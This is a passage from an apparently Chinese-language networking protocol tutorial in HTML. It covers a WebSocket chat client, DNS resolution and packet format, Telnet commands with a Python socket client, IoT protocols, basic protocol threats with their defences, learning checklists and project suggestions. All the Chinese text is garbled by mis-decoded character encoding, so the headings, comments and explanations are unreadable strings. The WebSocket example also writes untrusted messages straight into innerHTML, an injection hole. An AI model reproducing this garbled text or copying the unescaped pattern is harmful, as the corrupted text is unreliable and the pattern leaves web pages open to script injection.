        ws.onopen = function() {
            console.log('WebSocketè¿æ¥å·²å»ºç«‹');
            document.getElementById('output').innerHTML += '&lt;p&gt;å·²è¿æ¥åˆ°æœåŠ¡å™¨&lt;/p&gt;';
        };

        ws.onmessage = function(event) {
            console.log('æ”¶åˆ°æ¶ˆæ¯:', event.data);
            document.getElementById('output').innerHTML +=
                '&lt;p&gt;æœåŠ¡å™¨: ' + event.data + '&lt;/p&gt;';
        };

        ws.onclose = function() {
            console.log('WebSocketè¿æ¥å·²å…³é—­');
            document.getElementById('output').innerHTML += '&lt;p&gt;è¿æ¥å·²å…³é—­&lt;/p&gt;';
        };

        ws.onerror = function(error) {
            console.error('WebSocketé”™è¯¯:', error);
        };

        function sendMessage() {
            const message = document.getElementById('message').value;
            ws.send(message);
            document.getElementById('output').innerHTML +=
                '&lt;p&gt;æˆ‘: ' + message + '&lt;/p&gt;';
            document.getElementById('message').value = '';
        }
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="63-dns-åè®®æ·±åº¦è§£æ"><a class="header" href="#63-dns-åè®®æ·±åº¦è§£æ">6.3 DNS åè®®æ·±åº¦è§£æ</a></h3>
<h4 id="dnsæŸ¥è¯¢è¿‡ç¨‹"><a class="header" href="#dnsæŸ¥è¯¢è¿‡ç¨‹">DNSæŸ¥è¯¢è¿‡ç¨‹</a></h4>
<pre><code>1. æµè§ˆå™¨ç¼“å­˜
   â†“ (æœªæ‰¾åˆ°)
2. æ“ä½œç³»ç»Ÿç¼“å­˜ (/etc/hosts)
   â†“ (æœªæ‰¾åˆ°)
3. æœ¬åœ°DNSæœåŠ¡å™¨ (ISPæä¾›)
   â†“ (æœªæ‰¾åˆ°ï¼Œå¼€å§‹é€’å½’æŸ¥è¯¢)
4. æ ¹åŸŸåæœåŠ¡å™¨ (.)
   â†“ (è¿”å›é¡¶çº§åŸŸåæœåŠ¡å™¨åœ°å€)
5. é¡¶çº§åŸŸåæœåŠ¡å™¨ (.com)
   â†“ (è¿”å›æƒå¨åŸŸåæœåŠ¡å™¨åœ°å€)
6. æƒå¨åŸŸåæœåŠ¡å™¨ (example.com)
   â†“ (è¿”å›IPåœ°å€)
7. è¿”å›ç»™å®¢æˆ·ç«¯å¹¶ç¼“å­˜
</code></pre>
<h4 id="dnsæŠ¥æ–‡æ ¼å¼"><a class="header" href="#dnsæŠ¥æ–‡æ ¼å¼">DNSæŠ¥æ–‡æ ¼å¼</a></h4>
<pre><code> 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      Transaction ID                           â”‚
â”œâ”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚QRâ”‚ Opcode  â”‚AAâ”‚TCâ”‚RDâ”‚RAâ”‚Zâ”‚ADâ”‚CDâ”‚      Response Code        â”‚
â”œâ”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                    Question Count                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                    Answer Count                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                   Authority Count                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  Additional Count                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                      Questions                                â”‚
â”‚                      ...                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                      Answers                                  â”‚
â”‚                      ...                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                    Authority Records                          â”‚
â”‚                      ...                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                   Additional Records                          â”‚
â”‚                      ...                                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>æ ‡å¿—ä½è¯´æ˜</strong>:</p>
<ul>
<li><strong>QR</strong>: 0=æŸ¥è¯¢ï¼Œ1=å“åº”</li>
<li><strong>Opcode</strong>: æ“ä½œç ï¼ˆ0=æ ‡å‡†æŸ¥è¯¢ï¼Œ1=åå‘æŸ¥è¯¢ï¼‰</li>
<li><strong>AA</strong>: æƒå¨åº”ç­”</li>
<li><strong>TC</strong>: æˆªæ–­æ ‡å¿—</li>
<li><strong>RD</strong>: æœŸæœ›é€’å½’</li>
<li><strong>RA</strong>: å¯ç”¨é€’å½’</li>
<li><strong>Z</strong>: ä¿ç•™</li>
<li><strong>AD</strong>: å·²è®¤è¯æ•°æ®</li>
<li><strong>CD</strong>: æ£€æŸ¥ç¦ç”¨</li>
<li><strong>Rcode</strong>: å“åº”ç ï¼ˆ0=æ— é”™è¯¯ï¼Œ3=åŸŸåä¸å­˜åœ¨ï¼‰</li>
</ul>
<h4 id="dnsè®°å½•ç±»å‹è¯¦è§£"><a class="header" href="#dnsè®°å½•ç±»å‹è¯¦è§£">DNSè®°å½•ç±»å‹è¯¦è§£</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ç±»å‹</th><th>å€¼</th><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody>
<tr><td><strong>A</strong></td><td>1</td><td>IPv4åœ°å€</td><td>example.com -&gt; 93.184.216.34</td></tr>
<tr><td><strong>AAAA</strong></td><td>28</td><td>IPv6åœ°å€</td><td>example.com -&gt; 2606:2800:220:1:248:1893:25c8:1946</td></tr>
<tr><td><strong>CNAME</strong></td><td>5</td><td>åˆ«å</td><td>www.example.com -&gt; example.com</td></tr>
<tr><td><strong>MX</strong></td><td>15</td><td>é‚®ä»¶æœåŠ¡å™¨</td><td>example.com -&gt; mail.example.com (ä¼˜å…ˆçº§10)</td></tr>
<tr><td><strong>NS</strong></td><td>2</td><td>åŸŸåæœåŠ¡å™¨</td><td>example.com -&gt; ns1.example.com</td></tr>
<tr><td><strong>TXT</strong></td><td>16</td><td>æ–‡æœ¬è®°å½•</td><td>example.com -&gt; "v=spf1 include:_spf.google.com ~all"</td></tr>
<tr><td><strong>PTR</strong></td><td>12</td><td>åå‘è§£æ</td><td>34.216.184.93.in-addr.arpa -&gt; example.com</td></tr>
<tr><td><strong>SOA</strong></td><td>6</td><td>æˆæƒèµ·å§‹</td><td>åŒ…å«åŸŸçš„ä¸»è¦ä¿¡æ¯</td></tr>
<tr><td><strong>SRV</strong></td><td>33</td><td>æœåŠ¡è®°å½•</td><td>_http._tcp.example.com -&gt; server.example.com:80</td></tr>
</tbody></table>
</div>
<h3 id="64-telnet-åè®®"><a class="header" href="#64-telnet-åè®®">6.4 Telnet åè®®</a></h3>
<h4 id="telnetç‰¹ç‚¹"><a class="header" href="#telnetç‰¹ç‚¹">Telnetç‰¹ç‚¹</a></h4>
<ul>
<li><strong>è¿œç¨‹ç™»å½•åè®®</strong>: å…è®¸ç”¨æˆ·è¿œç¨‹è®¿é—®ä¸»æœº</li>
<li><strong>æ˜æ–‡ä¼ è¾“</strong>: ä¸åŠ å¯†ï¼Œå­˜åœ¨å®‰å…¨é£é™©</li>
<li><strong>é»˜è®¤ç«¯å£</strong>: 23</li>
<li><strong>å·²è¢«SSHå–ä»£</strong>: SSHæä¾›åŠ å¯†é€šä¿¡</li>
</ul>
<h4 id="telnetåè®®æ ¼å¼"><a class="header" href="#telnetåè®®æ ¼å¼">Telnetåè®®æ ¼å¼</a></h4>
<p><strong>Telnetå‘½ä»¤æ ¼å¼</strong>:</p>
<pre><code>IAC + Command + Option

IAC (Interpret As Command): 0xFF (255)
</code></pre>
<p><strong>å¸¸ç”¨å‘½ä»¤</strong>:</p>
<pre><code>SE   (240): å­é€‰é¡¹ç»“æŸ
NOP  (241): æ— æ“ä½œ
DM   (242): æ•°æ®æ ‡è®°
BRK  (243): ä¸­æ–­
IP   (244): ä¸­æ–­è¿›ç¨‹
AO   (245): ä¸­æ­¢è¾“å‡º
AYT  (246): ä½ åœ¨å—ï¼Ÿ
EC   (247): è½¬ä¹‰å­—ç¬¦
EL   (248): åˆ é™¤è¡Œ
GA   (249): ç»§ç»­
SB   (250): å­é€‰é¡¹å¼€å§‹
WILL (251): å°†è¦ä½¿ç”¨æŸé€‰é¡¹
WONT (252): ä¸ä¼šä½¿ç”¨æŸé€‰é¡¹
DO   (253): è¯·æ±‚å¯¹æ–¹ä½¿ç”¨æŸé€‰é¡¹
DONT (254): è¯·æ±‚å¯¹æ–¹ä¸ä½¿ç”¨æŸé€‰é¡¹
IAC  (255): å‘½ä»¤å¼€å§‹
</code></pre>
<p><strong>å®æˆ˜ç¤ºä¾‹ï¼šç®€å•Telnetå®¢æˆ·ç«¯</strong></p>
<pre><code class="language-python">import socket
import sys

class TelnetClient:
    """ç®€å•çš„Telnetå®¢æˆ·ç«¯"""

    def __init__(self, host, port=23):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        """è¿æ¥åˆ°TelnetæœåŠ¡å™¨"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"å·²è¿æ¥åˆ° {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"è¿æ¥å¤±è´¥: {e}")
            return False

    def send_command(self, command):
        """å‘é€å‘½ä»¤"""
        if not self.sock:
            print("æœªè¿æ¥åˆ°æœåŠ¡å™¨")
            return

        # å‘é€å‘½ä»¤
        self.sock.sendall(command.encode() + b'\r\n')

    def receive_data(self, timeout=1):
        """æ¥æ”¶æ•°æ®"""
        if not self.sock:
            return None

        self.sock.settimeout(timeout)
        try:
            data = self.sock.recv(4096)
            return data.decode('utf-8', errors='ignore')
        except socket.timeout:
            return None

    def close(self):
        """å…³é—­è¿æ¥"""
        if self.sock:
            self.sock.close()
            print("è¿æ¥å·²å…³é—­")

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    client = TelnetClient('localhost', 23)
    if client.connect():
        # æ¥æ”¶æ¬¢è¿æ¶ˆæ¯
        welcome = client.receive_data()
        if welcome:
            print(welcome)

        # å‘é€å‘½ä»¤
        client.send_command('ls')
        response = client.receive_data()
        if response:
            print(response)

        client.close()
</code></pre>
<hr />
<h2 id="ç¬¬ä¸ƒç« ç‰©è”ç½‘iotåè®®"><a class="header" href="#ç¬¬ä¸ƒç« ç‰©è”ç½‘iotåè®®">ç¬¬ä¸ƒç« ï¼šç‰©è”ç½‘(IoT)åè®®</a></h2>
<blockquote>
<p><strong>æ³¨æ„</strong>: IoTåè®®éƒ¨åˆ†ï¼ˆMQTTã€CoAPã€CANã€Bluetoothï¼‰çš„è¯¦ç»†å†…å®¹å·²æ‹†åˆ†åˆ°ç‹¬ç«‹æ–‡ä»¶ä¸­ã€‚</p>
<p>è¯¦è§: <code>protocol_iot.md</code></p>
</blockquote>
<h3 id="iotåè®®æ¦‚è§ˆ"><a class="header" href="#iotåè®®æ¦‚è§ˆ">IoTåè®®æ¦‚è§ˆ</a></h3>
<div class="table-wrapper"><table><thead><tr><th>åè®®</th><th>ä¼ è¾“å±‚</th><th>ç‰¹ç‚¹</th><th>åº”ç”¨åœºæ™¯</th></tr></thead><tbody>
<tr><td><strong>MQTT</strong></td><td>TCP</td><td>å‘å¸ƒ/è®¢é˜…ã€è½»é‡çº§</td><td>æ™ºèƒ½å®¶å±…ã€ä¼ æ„Ÿå™¨ç½‘ç»œ</td></tr>
<tr><td><strong>CoAP</strong></td><td>UDP</td><td>RESTfulã€ä½åŠŸè€—</td><td>å—é™è®¾å¤‡ã€M2Mé€šä¿¡</td></tr>
<tr><td><strong>CAN</strong></td><td>ç‰©ç†å±‚</td><td>å®æ—¶æ€§ã€å¯é æ€§</td><td>æ±½è½¦ã€å·¥ä¸šæ§åˆ¶</td></tr>
<tr><td><strong>Bluetooth</strong></td><td>æ— çº¿</td><td>çŸ­è·ç¦»ã€ä½åŠŸè€—</td><td>å¯ç©¿æˆ´è®¾å¤‡ã€è¿‘åœºé€šä¿¡</td></tr>
</tbody></table>
</div>
<p>æ›´å¤šè¯¦ç»†å†…å®¹è¯·å‚è€ƒ: <a href="protocol_iot.html">IoTåè®®è¯¦è§£</a></p>
<hr />
<h2 id="ç¬¬å…«ç« åè®®å®‰å…¨ä¸ä¼˜åŒ–"><a class="header" href="#ç¬¬å…«ç« åè®®å®‰å…¨ä¸ä¼˜åŒ–">ç¬¬å…«ç« ï¼šåè®®å®‰å…¨ä¸ä¼˜åŒ–</a></h2>
<h3 id="81-åè®®å®‰å…¨å¨èƒ"><a class="header" href="#81-åè®®å®‰å…¨å¨èƒ">8.1 åè®®å®‰å…¨å¨èƒ</a></h3>
<h4 id="å¸¸è§å®‰å…¨å¨èƒ"><a class="header" href="#å¸¸è§å®‰å…¨å¨èƒ">å¸¸è§å®‰å…¨å¨èƒ</a></h4>
<p><strong>1. ä¸­é—´äººæ”»å‡» (MITM)</strong></p>
<pre><code>æ”»å‡»è€…æ‹¦æˆªå¹¶å¯èƒ½ä¿®æ”¹é€šä¿¡æ•°æ®

é˜²å¾¡æªæ–½:
- ä½¿ç”¨TLS/SSLåŠ å¯†
- è¯ä¹¦éªŒè¯
- HTTPSå¼ºåˆ¶
</code></pre>
<p><strong>2. DDoSæ”»å‡»</strong></p>
<pre><code>åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»

ç±»å‹:
- SYN Flood
- UDP Flood
- HTTP Flood

é˜²å¾¡:
- é™æµ
- é˜²ç«å¢™
- CDN
</code></pre>
<p><strong>3. DNSåŠ«æŒ</strong></p>
<pre><code>ç¯¡æ”¹DNSè§£æç»“æœ

é˜²å¾¡:
- DNSSEC
- DNS over HTTPS (DoH)
- DNS over TLS (DoT)
</code></pre>
<h3 id="82-åè®®ä¼˜åŒ–æŠ€æœ¯"><a class="header" href="#82-åè®®ä¼˜åŒ–æŠ€æœ¯">8.2 åè®®ä¼˜åŒ–æŠ€æœ¯</a></h3>
<p><strong>1. è¿æ¥å¤ç”¨</strong></p>
<pre><code>HTTP/2: å¤šè·¯å¤ç”¨
å‡å°‘TCPæ¡æ‰‹å¼€é”€
</code></pre>
<p><strong>2. æ•°æ®å‹ç¼©</strong></p>
<pre><code>gzip, brotliå‹ç¼©
å‡å°‘ä¼ è¾“æ•°æ®é‡
</code></pre>
<p><strong>3. ç¼“å­˜ç­–ç•¥</strong></p>
<pre><code>CDNç¼“å­˜
æµè§ˆå™¨ç¼“å­˜
åº”ç”¨å±‚ç¼“å­˜
</code></pre>
<hr />
<h2 id="ç¬¬ä¹ç« å­¦ä¹ éªŒè¯ä¸å®æˆ˜é¡¹ç›®"><a class="header" href="#ç¬¬ä¹ç« å­¦ä¹ éªŒè¯ä¸å®æˆ˜é¡¹ç›®">ç¬¬ä¹ç« ï¼šå­¦ä¹ éªŒè¯ä¸å®æˆ˜é¡¹ç›®</a></h2>
<h3 id="91-å­¦ä¹ æ•ˆæœéªŒè¯æ ‡å‡†"><a class="header" href="#91-å­¦ä¹ æ•ˆæœéªŒè¯æ ‡å‡†">9.1 å­¦ä¹ æ•ˆæœéªŒè¯æ ‡å‡†</a></h3>
<h4 id="åŸºç¡€çŸ¥è¯†éªŒè¯-å¿…é¡»æŒæ¡"><a class="header" href="#åŸºç¡€çŸ¥è¯†éªŒè¯-å¿…é¡»æŒæ¡">åŸºç¡€çŸ¥è¯†éªŒè¯ (å¿…é¡»æŒæ¡)</a></h4>
<ul>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿè§£é‡Šç½‘ç»œåè®®çš„ä¸‰è¦ç´ ï¼ˆè¯­æ³•ã€è¯­ä¹‰ã€æ—¶åºï¼‰</li>
<li><input disabled="" type="checkbox"/>
ç†è§£OSIä¸ƒå±‚æ¨¡å‹å’ŒTCP/IPå››å±‚æ¨¡å‹çš„åŒºåˆ«</li>
<li><input disabled="" type="checkbox"/>
æŒæ¡TCPä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹çš„å®Œæ•´æµç¨‹</li>
<li><input disabled="" type="checkbox"/>
äº†è§£UDPä¸TCPçš„æœ¬è´¨åŒºåˆ«åŠåº”ç”¨åœºæ™¯</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿåˆ†æä»¥å¤ªç½‘å¸§ã€IPæ•°æ®åŒ…ã€TCPæ®µçš„ç»“æ„</li>
<li><input disabled="" type="checkbox"/>
ç†è§£ARPåè®®çš„å·¥ä½œåŸç†</li>
<li><input disabled="" type="checkbox"/>
æŒæ¡ICMPåè®®åŠpingã€tracerouteçš„å®ç°åŸç†</li>
<li><input disabled="" type="checkbox"/>
äº†è§£HTTP/HTTPSçš„å·¥ä½œæµç¨‹</li>
<li><input disabled="" type="checkbox"/>
ç†è§£DNSåŸŸåè§£æçš„å®Œæ•´è¿‡ç¨‹</li>
<li><input disabled="" type="checkbox"/>
æŒæ¡WebSocketçš„æ¡æ‰‹å’Œæ•°æ®å¸§æ ¼å¼</li>
</ul>
<h4 id="å®è·µèƒ½åŠ›éªŒè¯-æ ¸å¿ƒèƒ½åŠ›"><a class="header" href="#å®è·µèƒ½åŠ›éªŒè¯-æ ¸å¿ƒèƒ½åŠ›">å®è·µèƒ½åŠ›éªŒè¯ (æ ¸å¿ƒèƒ½åŠ›)</a></h4>
<ul>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿä½¿ç”¨Pythonå®ç°TCPå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿä½¿ç”¨Pythonå®ç°UDPé€šä¿¡</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿæ„é€ å’Œè§£æIPæ•°æ®åŒ…</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿå®ç°ç®€å•çš„pingç¨‹åº</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿå®ç°HTTPå®¢æˆ·ç«¯</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿä½¿ç”¨Wiresharkè¿›è¡Œåè®®åˆ†æ</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿè¯Šæ–­å¸¸è§çš„ç½‘ç»œè¿æ¥é—®é¢˜</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿç¼–å†™ç®€å•çš„åè®®è§£æå™¨</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿè®¾è®¡å’Œå®ç°è‡ªå®šä¹‰åº”ç”¨å±‚åè®®</li>
</ul>
<h4 id="è¿›é˜¶èƒ½åŠ›éªŒè¯-åŠ åˆ†é¡¹"><a class="header" href="#è¿›é˜¶èƒ½åŠ›éªŒè¯-åŠ åˆ†é¡¹">è¿›é˜¶èƒ½åŠ›éªŒè¯ (åŠ åˆ†é¡¹)</a></h4>
<ul>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿå®ç°WebSocketæœåŠ¡å™¨</li>
<li><input disabled="" type="checkbox"/>
ç†è§£å¹¶å®ç°åè®®åŠ å¯†ï¼ˆTLSæ¡æ‰‹ï¼‰</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿè¿›è¡Œç½‘ç»œæ€§èƒ½ä¼˜åŒ–</li>
<li><input disabled="" type="checkbox"/>
äº†è§£å¹¶èƒ½é˜²èŒƒå¸¸è§ç½‘ç»œæ”»å‡»ï¼ˆSYN Floodã€ARPæ¬ºéª—ï¼‰</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿå®ç°MQTTæˆ–CoAPå®¢æˆ·ç«¯</li>
<li><input disabled="" type="checkbox"/>
ç†è§£HTTP/2å’ŒHTTP/3çš„æ”¹è¿›</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿè¿›è¡Œåè®®æ¨¡ç³Šæµ‹è¯•</li>
</ul>
<h3 id="92-å®æˆ˜é¡¹ç›®å»ºè®®"><a class="header" href="#92-å®æˆ˜é¡¹ç›®å»ºè®®">9.2 å®æˆ˜é¡¹ç›®å»ºè®®</a></h3>
<h4 id="åˆçº§é¡¹ç›®"><a class="header" href="#åˆçº§é¡¹ç›®">åˆçº§é¡¹ç›®</a></h4>
<p><strong>1. ç®€å•HTTPæœåŠ¡å™¨</strong></p>
<pre><code>åŠŸèƒ½:
- å¤„ç†GET/POSTè¯·æ±‚
- é™æ€æ–‡ä»¶æœåŠ¡
- åŸºæœ¬çš„è·¯ç”±åŠŸèƒ½

æŠ€æœ¯æ ˆ: Python socket
å­¦ä¹ ç›®æ ‡: æ·±å…¥ç†è§£HTTPåè®®
</code></pre>
<p><strong>2. èŠå¤©å®¤ç¨‹åº</strong></p>
<pre><code>åŠŸèƒ½:
- TCPå¤šå®¢æˆ·ç«¯èŠå¤©
- ç”¨æˆ·ç™»å½•/é€€å‡º
- æ¶ˆæ¯å¹¿æ’­

æŠ€æœ¯æ ˆ: Python socket + threading
å­¦ä¹ ç›®æ ‡: ç†è§£TCPè¿æ¥ç®¡ç†
</code></pre>
<p><strong>3. DNSå®¢æˆ·ç«¯</strong></p>
<pre><code>åŠŸèƒ½:
- æ„é€ DNSæŸ¥è¯¢
- è§£æDNSå“åº”
- æ”¯æŒå¤šç§è®°å½•ç±»å‹

æŠ€æœ¯æ ˆ: Python socket + struct
å­¦ä¹ ç›®æ ‡: ç†è§£DNSåè®®æ ¼å¼
</code></pre>
<h4 id="ä¸­çº§é¡¹ç›®"><a class="header" href="#ä¸­çº§é¡¹ç›®">ä¸­çº§é¡¹ç›®</a></h4>
<p><strong>1. HTTPä»£ç†æœåŠ¡å™¨</strong></p>
<pre><code>åŠŸèƒ½:
- è½¬å‘HTTPè¯·æ±‚
- ç¼“å­˜åŠŸèƒ½
- è®¿é—®æ§åˆ¶

æŠ€æœ¯æ ˆ: Python
å­¦ä¹ ç›®æ ‡: ç†è§£HTTPä»£ç†åŸç†
</code></pre>
<p><strong>2. ç½‘ç»œåè®®åˆ†æå·¥å…·</strong></p>
<pre><code>åŠŸèƒ½:
- æŠ“åŒ…
- åè®®è§£æ
- æµé‡ç»Ÿè®¡

æŠ€æœ¯æ ˆ: Python scapy
å­¦ä¹ ç›®æ ‡: æ·±å…¥ç†è§£åè®®ç»“æ„
</code></pre>
<p><strong>3. WebSocketå®æ—¶åº”ç”¨</strong></p>
<pre><code>åŠŸèƒ½:
- WebSocketæœåŠ¡å™¨
- å®æ—¶æ•°æ®æ¨é€
- å¤šæˆ¿é—´èŠå¤©

æŠ€æœ¯æ ˆ: Python/Node.js
å­¦ä¹ ç›®æ ‡: ç†è§£å…¨åŒå·¥é€šä¿¡
</code></pre>
<h4 id="é«˜çº§é¡¹ç›®"><a class="header" href="#é«˜çº§é¡¹ç›®">é«˜çº§é¡¹ç›®</a></h4>
<p><strong>1. åˆ†å¸ƒå¼çˆ¬è™«ç³»ç»Ÿ</strong></p>
<pre><code>åŠŸèƒ½:
- å¤šèŠ‚ç‚¹çˆ¬å–
- ä»»åŠ¡åˆ†å‘
- ç»“æœèšåˆ

æŠ€æœ¯æ ˆ: Python + Redis + MQTT
å­¦ä¹ ç›®æ ‡: ç†è§£åˆ†å¸ƒå¼é€šä¿¡
</code></pre>
<p><strong>2. IoTæ•°æ®é‡‡é›†å¹³å°</strong></p>
<pre><code>åŠŸèƒ½:
- MQTTæ¶ˆæ¯è®¢é˜…
- æ•°æ®å­˜å‚¨
- å®æ—¶ç›‘æ§

æŠ€æœ¯æ ˆ: MQTT + WebSocket + Database
å­¦ä¹ ç›®æ ‡: ç†è§£IoTåè®®åº”ç”¨
</code></pre>
<p><strong>3. ç½‘ç»œå®‰å…¨å·¥å…·</strong></p>
<pre><code>åŠŸèƒ½:
- ç«¯å£æ‰«æ
- åè®®è¯†åˆ«
- æ¼æ´æ£€æµ‹

æŠ€æœ¯æ ˆ: Python scapy + nmap
å­¦ä¹ ç›®æ ‡: ç†è§£ç½‘ç»œå®‰å…¨
</code></pre>
<hr />
<h2 id="é™„å½•"><a class="header" href="#é™„å½•">é™„å½•</a></h2>
<h3 id="a-å­¦ä¹ èµ„æºæ¨è"><a class="header" href="#a-å­¦ä¹ èµ„æºæ¨è">A. å­¦ä¹ èµ„æºæ¨è</a></h3>
<p><strong>ç»å…¸ä¹¦ç±</strong>:</p>
<ul>
<li>ã€ŠTCP/IPè¯¦è§£ å·1: åè®®ã€‹ - W. Richard Stevensï¼ˆå¿…è¯»ï¼‰</li>
<li>ã€Šè®¡ç®—æœºç½‘ç»œã€‹ï¼ˆç¬¬7ç‰ˆï¼‰ - Andrew S. Tanenbaum</li>
<li>ã€ŠHTTPæƒå¨æŒ‡å—ã€‹ - David Gourley</li>
<li>ã€Šå›¾è§£TCP/IPã€‹ - ç«¹ä¸‹éš†å²</li>
<li>ã€Šç½‘ç»œåè®®åˆ†æä¸è®¾è®¡ã€‹ - æå–„ä»“</li>
</ul>
<p><strong>åœ¨çº¿èµ„æº</strong>:</p>
<ul>
<li>RFCæ–‡æ¡£åº“: https://www.rfc-editor.org/</li>
<li>Wiresharkå®˜æ–¹æ•™ç¨‹: https://www.wireshark.org/docs/</li>
<li>Python Socketç¼–ç¨‹: https://docs.python.org/3/library/socket.html</li>
<li>Mozilla HTTPæ–‡æ¡£: https://developer.mozilla.org/en-US/docs/Web/HTTP</li>
<li>CloudFlare Learning: https://www.cloudflare.com/learning/</li>
</ul>
<p><strong>å·¥å…·æ¨è</strong>:</p>
<ul>
<li><strong>Wireshark</strong>: ç½‘ç»œåè®®åˆ†æå™¨ï¼ˆå¿…å¤‡ï¼‰</li>
<li><strong>tcpdump</strong>: å‘½ä»¤è¡ŒæŠ“åŒ…å·¥å…·</li>
<li><strong>nmap</strong>: ç½‘ç»œæ‰«æå·¥å…·</li>
<li><strong>Postman</strong>: APIæµ‹è¯•å·¥å…·</li>
<li><strong>curl</strong>: å‘½ä»¤è¡ŒHTTPå®¢æˆ·ç«¯</li>
<li><strong>netcat</strong>: ç½‘ç»œç‘å£«å†›åˆ€</li>
<li><strong>scapy</strong>: Pythonç½‘ç»œåè®®åº“</li>
